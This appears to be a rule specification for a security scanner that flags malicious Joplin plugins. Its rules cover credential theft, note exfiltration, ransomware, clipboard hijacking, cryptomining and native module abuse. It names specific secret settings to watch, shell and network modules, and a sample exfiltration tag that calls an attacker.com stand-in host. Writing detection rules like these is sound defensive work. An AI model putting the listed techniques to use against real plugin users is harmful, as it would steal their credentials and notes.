# Phase 1: Critical Threats

## Rule 1 : Dynamic Code Execution
Detects remote or cross-boundary sources being executed as JavaScript or VM code.
- **Attack Vectors:** Usage of `eval()`, `new Function()` body execution, or dynamic timer scripts using remote inputs. Bypassing `joplin.require` to use native `require('child_process')` with remote payloads.
- **Severity:** error

## Rule 2 : Secret and Key Theft
Detects Joplin sensitive settings flowing into external, filesystem, command, or Joplin UI/storage sinks.
- **Attack Vectors:** Calling `joplin.settings.globalValue(s)` targeting `syncInfoCache`, `encryption.masterPassword`, `encryption.cachedPpk`, `encryption.passwordCache`, `sync.*.password`, `sync.*.auth`, `sync.*.context`, `sync.5.username`, `sync.6.username`, `sync.9.username`, `sync.10.username`, `sync.10.userEmail`, `sync.userId`, or `clientId`. Piping the retrieved data to a network request, writing it to disk, passing it to `child_process`, or injecting it into an external webview.
- **Severity:** error

## Rule 2b : Suspicious Sensitive Key Access
Flags suspicious reads of highly sensitive settings even when no exfiltration sink is proven.
- **Attack Vectors:** Attempted access of highly sensitive credentials at runtime (such as reading `api.token`, `encryption.cachedPpk`, `syncInfoCache`, or combined access of both `masterPassword` and `syncInfoCache` in the same codebase) serving as a manual review signal.
- **Severity:** warning

## Rule 3 : Unauthorized FS Access & Self-Modification
Detects filesystem access outside the plugin sandbox, plugin package self-modification, and hardcoded sensitive path targeting.
- **Attack Vectors:** Usage of native `fs` or `joplin.require('fs-extra')` targeting `__dirname + '/index.js'` or `~/.config/joplin-desktop` to rewrite core configs (`database.sqlite`), or overwriting its own installed source files after installation to swap code for malware.
- **Severity:** error

## Rule 4 : Network Backdoor
Detects server or socket objects flowing into local listener methods.
- **Attack Vectors:** Usage of `net.createServer()`, `http.createServer()`, `tls.createServer()`, `dgram.createSocket()`, `ws.Server`, `socket.io` Server, or Express/Koa/Fastify app initialization and binding.
- **Severity:** error

## Rule 5 : Clipboard Hijacking
Detects clipboard injection, exfiltration, execution, and background clipboard access.
- **Attack Vectors:** Background loops or intervals calling `joplin.clipboard.readText()` to scan clipboard contents silently, exfiltrating contents to a network sink, evaluating clipboard data as code, or writing/swapping clipboard data under conditions indicating injection.
- **Severity:** error

## Rule 6 : Native Binary & Cryptojacking
Detects remote payloads or cryptominer indicators flowing into command execution.
- **Attack Vectors:** Dynamically downloading/unpacking compiled binaries, spawning miners, using Web Workers for crypto-mining, or executing miner keyword scripts (`xmrig`, `pool.`, etc.) via shell environments.
- **Severity:** error

## Rule 7 : Command Execution (Catch-All)
Detects Joplin data or callback data flowing into command execution, plus hardcoded command strings.
- **Attack Vectors:** Generic command execution or passing of hardcoded command strings to shell execution (`exec`, `spawn`, etc.) that are not categorized by Rule 6.
- **Severity:** warning

## Rule 8 : Data Exfiltration
Detects note, folder, resource, or selected note data flowing into non-local network requests.
- **Attack Vectors:** Reading `joplin.data.get(['notes'])` or `joplin.workspace.selectedNote()` and exfiltrating the contents to a remote server.
- **Severity:** warning

## Rule 9 : Mass Encryption / Ransomware
Detects note reads that are encrypted and written back to notes, plus encryption key exfiltration.
- **Attack Vectors:** A flow combining note reading (`joplin.data.get(["notes", ...])`), cryptographic modules, and overwriting the originals (`joplin.data.put()`).
- **Severity:** warning

## Rule 9b : Critical Ransomware Key Exfiltration
Detects crypt cipher keys flowing to network endpoints during note encryption.
- **Attack Vectors:** Exfiltrating keys used in cipher creation to external endpoints.
- **Severity:** error

## Rule 10 : Silent Backup Hijacking (Taint)
Detects export module data flowing into unauthorized sinks (network, terminal execution, or file write outside the export context destination).
- **Attack Vectors:** Silent siphoning of plaintext backup data during a user-initiated export module hook call.
- **Severity:** error

## Rule 10b : Silent Backup Hijacking (Structural)
Detects filesystem writes, shell commands, or network request indicators inside export callbacks.
- **Attack Vectors:** Lexical execution of network, process, or file writes inside export hooks without verified data taint.
- **Severity:** warning

## Rule 11 : Remote Webview Scripts
Detects sensitive Joplin data exfiltrated into external webview URLs.
- **Attack Vectors:** Injecting user notes or configuration values into an external image/iframe/link URL tag (e.g. `<img src="https://attacker.com/log?data=sensitive">`) to smuggle data.
- **Severity:** warning

## Rule 11b : Remote Webviews (Structural)
Detects loading remote scripts or documents dynamically in a panel or dialog HTML.
- **Attack Vectors:** `<iframe src="...">` or `<script src="...">` tags loaded into HTML that point to external, non-localhost domains.
- **Severity:** warning

## Rule 12 : Sync Smuggling (Intra-API Exfiltration)
Detects copying Joplin data into hidden synced metadata and executing payloads read from hidden metadata.
- **Attack Vectors:** Storing execution commands, or using the user's sync target as a stealthy exfiltration channel. Reading `joplin.data.get(['notes'])` and copying the contents into a note's invisible `userDataSet`.
- **Severity:** error

## Rule 13 : UI Phishing & Credential Harvesting
Detects credential-like dialog or panel submissions flowing to the network.
- **Attack Vectors:** Mimicking official Joplin or general authentication dialogs using `<input type="password">` or fake branding, and piping resulting `formData` to a network request.
- **Severity:** error

## Rule 14 : Resource Exhaustion & Quota DoS
Detects unbounded creation of Joplin entities and filesystem writes that can exhaust storage.
- **Attack Vectors:** Asynchronous loops generating massive amounts of junk entities like `joplin.data.post(['tags'])` or generating large binary resources via `fs.writeFileSync` inside unbounded loops or setInterval intervals.
- **Severity:** warning

## Rule 15 : Semantic Integrity Sabotage (Gaslighting)
Detects note mutation directly inside workspace event hooks.
- **Attack Vectors:** Silently modifying user notes in a malicious or destabilizing manner. Mutating or deleting notes inside a workspace hook callback (like `onNoteSelectionChange`).
- **Severity:** error

## Rule 16 : Electron Main Process Takeover
Detects direct access to Electron remote APIs.
- **Attack Vectors:** Any import or requirement of `@electron/remote` to control the app window or bypass renderer restrictions.
- **Severity:** error

## Rule 16b : Unauthorized Electron API Usage
Detects direct Electron module usage that bypasses Joplin plugin APIs.
- **Attack Vectors:** Directly importing `electron` modules (e.g., `BrowserWindow`, `dialog`, `app`, `clipboard`, `shell`) instead of using Joplin official equivalents.
- **Severity:** warning

## Rule 17 : Untrusted Archive Extraction
Detects remote or message-controlled archives being extracted without a safe destination and without an integrity-check barrier.
- **Attack Vectors:** Calling `joplin.fs.archiveExtract()` where either argument originates from user input or a remotely fetched source.
- **Severity:** warning

## Rule 17b : Unsafe Archive Extraction Destination
Detects archive extraction destinations derived from unsafe path sources.
- **Attack Vectors:** Extraction destinations derived from system properties or env variables targeting core directories outside of `dataDir()`.
- **Severity:** error

## Rule 17c : Archive Entry Traversal
Detects extracted archive entries flowing into filesystem paths or command execution.
- **Attack Vectors:** Maliciously crafted zip entry names (Zip Slip) attempting to overwrite files outside the intended destination directory.
- **Severity:** warning

## Rule 18 : Mass Data Destruction
Detects destructive Joplin data operations that can delete or wipe many records.
- **Attack Vectors:** Iterating through notes/folders inside loops to permanently destroy database entries or wipe bodies.
- **Severity:** error

## Rule 19 : Keylogging & Silent Surveillance
Detects live hook data or hook-local reads flowing to network requests.
- **Attack Vectors:** Hooking into `onNoteContentChange` or `onNoteChange` callbacks and exfiltrating what the user reads or types to a network request.
- **Severity:** error

## Rule 20 : Malicious Import Module
Detects imported-file context or contents flowing to dangerous sinks during custom import module execution.
- **Attack Vectors:** Registering a custom import module to drop malware, write unauthorized file structures, or execute payloads.
- **Severity:** warning

## Rule 21 : Native Module Imports
Detects bypassing the `joplin.require()` API to gain full host machine access.
- **Attack Vectors:** Direct imports of `child_process`, `net`, `os`, `dgram` via `require()`, `window.require()`, or TypeScript `import` statements.
- **Severity:** error
